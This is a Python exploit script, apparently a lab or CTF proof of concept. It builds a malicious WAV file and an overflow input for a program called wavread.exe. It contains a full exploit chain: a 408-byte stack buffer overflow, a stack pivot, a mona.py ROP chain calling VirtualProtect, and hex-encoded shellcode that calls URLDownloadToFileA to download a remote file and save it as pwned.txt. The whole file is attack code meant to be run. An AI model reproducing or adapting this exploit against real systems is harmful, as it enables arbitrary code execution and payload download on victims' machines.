import os
import sys
import struct

"""
This script generates:
  exploit.wav which contains a ROP chain and shellcode
  command.txt which contains a buffer overflow and stack pivot

Usage: python wav.py

The shellcode payload is a call to URLDownloadToFileA. It will attempt to access
http://127.0.0.1/test1.tmp and save the contents to pwned.txt. The HTTP endpoint
is left to the user. Suggestion: "python -m SimpleHTTPServer 80" in a directory
with a file called test1.tmp.
"""

def create_rop_chain():
	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	  0x0041dc36,  # POP EBP # RETN [wavread.exe]
      0x0041dc36,  # skip 4 bytes [wavread.exe]
      0x0041040e,  # POP EBX # RETN [wavread.exe]
      0x000003e8,  # 0x00000201-> ebx
      0x0041d3d8,  # POP EDX # RETN [wavread.exe]
      0x00000040,  # 0x00000040-> edx
      0x00410154,  # POP ECX # RETN [wavread.exe]
      0x00433446,  # &Writable location [wavread.exe]
      0x0040c915,  # POP EDI # RETN [wavread.exe]
      0x00413707,  # RETN (ROP NOP) [wavread.exe]
      0x00413073,  # POP ESI # RETN [wavread.exe]
      0x0041d6ca,  # JMP [EAX] [wavread.exe]
      0x0040fdb7,  # POP EAX # POP ESI # POP EBP # RETN [wavread.exe]
      0x00427008,  # ptr to &VirtualProtect() [IAT wavread.exe]
      0x0041d6ca,  # Filler (compensate)
      0x004107ed,  # Return to a stack pivot
      0x0040170e,  # PUSHAD # RETN [wavread.exe]
      0x00000000,  # <- Unable to find ptr to 'jmp esp'
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

offset = 4
padding = "\x44" * offset
rop_chain = create_rop_chain()
nops = "\x90" * 12
nops += struct.pack('<L', 0x00436088)  # offset into my wav file
payload = "\xBC\xEC\xCD\x18\x00\xE8\x00\x00\x00\x00\x5A\x8D\x52\xF6\x89\xE5\x81\xEC\x00\x10\x00\x00\x52\xBB\x8E\xFE\x1F\x4B\xE8\x6E\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x2A\x01\x00\x00\x8D\xBA\x32\x01\x00\x00\xE8\x8E\x00\x00\x00\x5A\x5D\x55\x52\x31\xC9\x66\xB9\x6F\x6E\x51\x68\x75\x72\x6C\x6D\x54\x8B\x82\x32\x01\x00\x00\xFF\xD0\x83\xC4\x08\x5A\x5D\x52\xBB\x28\x81\x00\x17\xE8\x2F\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x36\x01\x00\x00\x8D\xBA\x3E\x01\x00\x00\xE8\x4F\x00\x00\x00\x5A\x5D\x55\x52\x31\xC9\x51\x51\x8D\xB2\x42\x01\x00\x00\x8D\xBA\x5D\x01\x00\x00\x57\x56\x51\xFF\xD0\xFC\x31\xFF\x64\x8B\x3D\x30\x00\x00\x00\x8B\x7F\x0C\x8B\x7F\x14\x8B\x77\x28\x31\xD2\x66\xAD\x84\xC0\x74\x11\x3C\x41\x72\x06\x3C\x5A\x77\x02\x0C\x20\xC1\xC2\x07\x30\xC2\xEB\xE9\x39\xDA\x8B\x47\x10\x8B\x3F\x75\xDB\xC3\x89\xEA\x03\x52\x3C\x8B\x52\x78\x01\xEA\x8B\x5A\x20\x01\xEB\x31\xC9\x57\x56\x8B\x36\x8B\x3B\x01\xEF\x52\x31\xD2\xC1\xC2\x07\x32\x17\x47\x80\x3F\x00\x75\xF5\x92\x5A\x39\xF0\x74\x0C\x83\xC3\x04\x41\x39\x4A\x18\x75\xDF\x5E\x5F\xC3\x5E\x5F\xAD\x56\x53\x89\xEB\x89\xDE\x03\x5A\x24\x8D\x04\x4B\x0F\xB7\x00\x8D\x04\x86\x03\x42\x1C\x8B\x00\x01\xF0\xAB\x5B\x5E\x83\xC3\x04\x41\x81\x3E\xFF\xFF\x00\x00\x75\xAD\xC3\x26\x80\xAC\xC8\xFF\xFF\x00\x00\x01\x00\x00\x00\x99\x23\x5D\xD9\xFF\xFF\x00\x00\x01\x00\x00\x00\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31\x2F\x74\x65\x73\x74\x31\x2E\x74\x6D\x70\x00\x70\x77\x6E\x65\x64\x2E\x74\x78\x74\x00"
header = "RIFF" # must exist
header += struct.pack('<L', 0x01cc45d4)
header += "WAVE" # must exist
header += "fmt "  # must exist
"""
The following 20 bytes will be on the stack and are not validated. Can use these to start ROP
"""
header += struct.pack('<L', 0x004135a7)  # POP EAX # POP EBP # RETN    ** [wavread.exe] **   |  startnull {PAGE_EXECUTE_READ}
header += struct.pack('<L', 0x00436030)  # address of shellcode from wav file
header += struct.pack('<L', 0x43434343)
header += struct.pack('<L', 0x0041645b) # XCHG EAX,ESP # RETN    ** [wavread.exe] **   |  startnull,asciiprint,ascii {PAGE_EXECUTE_READ}
header += struct.pack('<L', 0x00040010)
header += "data" # must exist
header += struct.pack('<L', 0x01cc45b0)
payload = header + padding + rop_chain + nops  + payload

binary_file = open("exploit.wav", "w") #create and write file
binary_file.write(payload)
binary_file.close()

"""
Size to overwrite RIP: 408
With stack pivot +16 i land in the above header file
"""
command = "\x42" * 408
command += struct.pack('<L', 0x0042661e) # stack pivot +16
command_file = open("command.txt", "w")
command_file.write(command)
command_file.close()
print 'Wrote {0} bytes. ROP chain {1}, filler {2}'.format(len(command), len(rop_chain), (333 + (408-len(command)-len(rop_chain))))

